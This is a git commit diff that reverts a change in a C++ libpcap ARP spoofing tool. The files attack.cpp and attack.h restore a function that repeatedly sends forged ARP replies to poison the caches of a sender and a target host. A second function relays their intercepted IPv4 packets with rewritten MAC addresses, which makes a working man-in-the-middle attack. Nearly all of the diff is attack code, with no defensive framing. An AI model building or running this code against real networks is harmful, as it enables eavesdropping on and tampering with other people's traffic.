e06f00abec6afe7beb87b49fb111f39d30b20a14
Seohyun Jang <shjanghd@gmail.com>
2024-04-17 22:00:30 +0900

    Revert "producer and comsumer"
    This reverts commit bd1b29334b0cf9fc8c6b2ac649f8a775aa949860.

--- attack.cpp
+++ attack.cpp
@@ -1,18 +1,57 @@
 #include "attack.h"
 
-void *arp_infect(
-    char *dev, Mac *attacker_mac, Ip *attacker_ip, Mac *sender_mac, Ip *sender_ip, Mac *target_mac, Ip *target_ip,
-    volatile bool *running
-) {
+void *sendArpReply(void *args) {
+    SendArpReplyArgs *send_arp_reply_args = (SendArpReplyArgs *)args;
+    volatile bool *running = send_arp_reply_args->running;
+    char *dev = send_arp_reply_args->dev;
+    Mac *attacker_mac = send_arp_reply_args->attacker_mac;
+    Ip *attacker_ip = send_arp_reply_args->attacker_ip;
+    Mac *sender_mac = send_arp_reply_args->sender_mac;
+    Ip *sender_ip = send_arp_reply_args->sender_ip;
+    Mac *target_mac = send_arp_reply_args->target_mac;
+    Ip *target_ip = send_arp_reply_args->target_ip;
+
+    EthArpPacket sender_packet, target_packet;
+
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
     if (handle == nullptr) {
         fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
         return NULL;
     }
-    
-    EthArpPacket sender_packet = EthArpPacket(*sender_mac, *attacker_mac, ArpHdr::Reply, *attacker_mac, *target_ip, *sender_mac, *sender_ip);
-    EthArpPacket target_packet = EthArpPacket(*target_mac, *attacker_mac, ArpHdr::Reply, *attacker_mac, *sender_ip, *target_mac, *target_ip);
+
+    sender_packet.eth_.dmac_ = *sender_mac;
+    sender_packet.eth_.smac_ = *attacker_mac;
+    sender_packet.eth_.type_ = htons(EthHdr::Arp);
+
+    sender_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+    sender_packet.arp_.pro_ = htons(EthHdr::Ip4);
+    sender_packet.arp_.hln_ = Mac::SIZE;
+    sender_packet.arp_.pln_ = Ip::SIZE;
+    sender_packet.arp_.op_ = htons(ArpHdr::Reply);
+    sender_packet.arp_.smac_ = *attacker_mac;
+    // sender_packet.arp_.smac_ = Mac("E0:0A:F6:67:FF:25");
+    sender_packet.arp_.sip_ = htonl(*target_ip);
+    sender_packet.arp_.tmac_ = *sender_mac;
+    sender_packet.arp_.tip_ = htonl(*sender_ip);
+
+
+
+    target_packet.eth_.dmac_ = *target_mac;
+    target_packet.eth_.smac_ = *attacker_mac;
+    target_packet.eth_.type_ = htons(EthHdr::Arp);
+
+    target_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+    target_packet.arp_.pro_ = htons(EthHdr::Ip4);
+    target_packet.arp_.hln_ = Mac::SIZE;
+    target_packet.arp_.pln_ = Ip::SIZE;
+    target_packet.arp_.op_ = htons(ArpHdr::Reply);
+    target_packet.arp_.smac_ = *attacker_mac;
+    // target_packet.arp_.smac_ = Mac("E0:0A:F6:67:FF:25");
+    target_packet.arp_.sip_ = htonl(*sender_ip);
+    target_packet.arp_.tmac_ = *target_mac;
+    target_packet.arp_.tip_ = htonl(*target_ip);
+
 
     while (*running) {
         int res;
@@ -35,65 +74,15 @@ void *arp_infect(
     return NULL;
 }
 
-void *send_modified_packet(pcap_t* handle, const u_char* packet, int caplen, Mac *src, Mac *dst) {
-    EthHdr* eth = (EthHdr*)packet;
-    eth->dmac_ = *dst;
-    eth->smac_ = *src;
-    int res = pcap_sendpacket(handle, packet, caplen);
-    if (res != 0) fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-    return NULL;
-}
+void *relayPacket(void *args) {
+    RelayPacketArgs *relay_packet_args = (RelayPacketArgs *)args;
+    volatile bool *running = relay_packet_args->running;
+    char *dev = relay_packet_args->dev;
+    Mac *attacker_mac = relay_packet_args->attacker_mac;
+    Mac *sender_mac = relay_packet_args->sender_mac;
+    Ip *sender_ip = relay_packet_args->sender_ip;
+    Mac *target_mac = relay_packet_args->target_mac;
 
-void *relay_packet(
-    char *dev, Mac *attacker_mac, Mac *sender_mac, Ip *sender_ip, Mac *target_mac,
-    int sender_to_target_idx, int target_to_sender_idx,
-    std::vector<PacketQueue> *packet_queue,
-    volatile bool *running,
-    std::mutex *m, std::condition_variable *cv
-) {
-    char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
-    if (handle == nullptr) {
-        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
-        return NULL;
-    }
-
-    PacketQueue sender_to_target_queue = (*packet_queue)[sender_to_target_idx];
-    PacketQueue target_to_sender_queue = (*packet_queue)[target_to_sender_idx];
-
-    while (*running) {
-        std::unique_lock<std::mutex> lock(*m);
-        cv->wait(lock, [&] { return !sender_to_target_queue.empty() || !target_to_sender_queue.empty() || !*running; });
-        if (!*running) {
-            lock.unlock();
-            break;
-        }
-
-        Packet packet;
-        int caplen;
-        if (!sender_to_target_queue.empty()) {
-            std::tie(packet, caplen) = sender_to_target_queue.front();
-            send_modified_packet(handle, packet, caplen, attacker_mac, target_mac);
-        }
-
-        if (!target_to_sender_queue.empty()) {
-            std::tie(packet, caplen) = target_to_sender_queue.front();
-            send_modified_packet(handle, packet, caplen, attacker_mac, sender_mac);
-        }
-
-        lock.unlock();
-    }
-
-    pcap_close(handle);
-    return NULL;
-}
-
-void *receive_packet(
-    char *dev,
-    volatile bool *running,
-    std::vector<PacketQueue> *packet_queue, IpMap *ip_map,
-    std::mutex *m, std::condition_variable *cv
-) {
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
     if (handle == nullptr) {
@@ -104,25 +93,27 @@ void *receive_packet(
     while (*running) {
         struct pcap_pkthdr* header;
         const u_char* packet;
-        int res = pcap_next_ex(handle, &header, &packet);
+        int res;
+        res = pcap_next_ex(handle, &header, &packet);
         if (res == 0) continue;
         if (res == -1 || res == -2) {
             fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
-            break;
+            return NULL;
         }
 
         EthHdr* eth = (EthHdr*)packet;
         if (eth->type() != EthHdr::Ip4) continue;
+        IpHdr* ipv4 = (IpHdr*)(packet + sizeof(EthHdr));
+        if (eth->smac_ == *sender_mac) eth->dmac_ = *target_mac;
+        else if (ipv4->dip() == *sender_ip) eth->dmac_ = *sender_mac;
+        else continue;
 
-        IpHdr* ip = (IpHdr*)(packet + sizeof(EthHdr));
-        IpPair ip_pair = std::make_pair(ip->sip(), ip->dip());
-        if (ip_map->find(ip_pair) == ip_map->end()) continue;
-
-        int idx = (*ip_map)[ip_pair];
-        std::unique_lock<std::mutex> lock(*m);
-        (*packet_queue)[idx].push({packet, header->caplen});
-        lock.unlock();
-        cv->notify_all();
+        eth->smac_ = *attacker_mac;
+        res = pcap_sendpacket(handle, packet, header->caplen);
+        if (res != 0) {
+            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+            return NULL;
+        }
     }
 
     pcap_close(handle);
--- attack.h
+++ attack.h
@@ -2,38 +2,30 @@
 
 #include <cstdio>
 #include <pcap.h>
-
-#include <thread>
-#include <queue>
-#include <vector>
-#include <map>
-#include <utility>
-#include <condition_variable>
-
 #include "ethhdr.h"
 #include "arphdr.h"
 #include "iphdr.h"
 #include "util.h"
 
-using IpPair = std::pair<uint32_t, uint32_t>;
-using IpMap = std::map<IpPair, int>;
-using Packet = const u_char*;
-using PacketQueue = std::queue<std::pair<Packet, int>>;
+struct SendArpReplyArgs {
+    volatile bool *running;
+    char *dev;
+    Mac *attacker_mac;
+    Ip *attacker_ip;
+    Mac *sender_mac;
+    Ip *sender_ip;
+    Mac *target_mac;
+    Ip *target_ip;
+};
 
-void *arp_infect(
-    char *dev, Mac *attacker_mac, Ip *attacker_ip, Mac *sender_mac, Ip *sender_ip, Mac *target_mac, Ip *target_ip,
-    volatile bool *running
-);
-void *relay_packet(
-    char *dev, Mac *attacker_mac, Mac *sender_mac, Ip *sender_ip, Mac *target_mac,
-    int sender_to_target_idx, int target_to_sender_idx,
-    std::vector<PacketQueue> *packet_queue,
-    volatile bool *running,
-    std::mutex *m, std::condition_variable *cv
-);
-void *receive_packet(
-    char *dev,
-    volatile bool *running,
-    std::vector<PacketQueue> *packet_queue, IpMap *ip_map,
-    std::mutex *m, std::condition_variable *cv
-);
+struct RelayPacketArgs {
+    volatile bool *running;
+    char *dev;
+    Mac *attacker_mac;
+    Mac *sender_mac;
+    Ip *sender_ip;
+    Mac *target_mac;
+};
+
+void *sendArpReply(void *args);
+void *relayPacket(void *args);
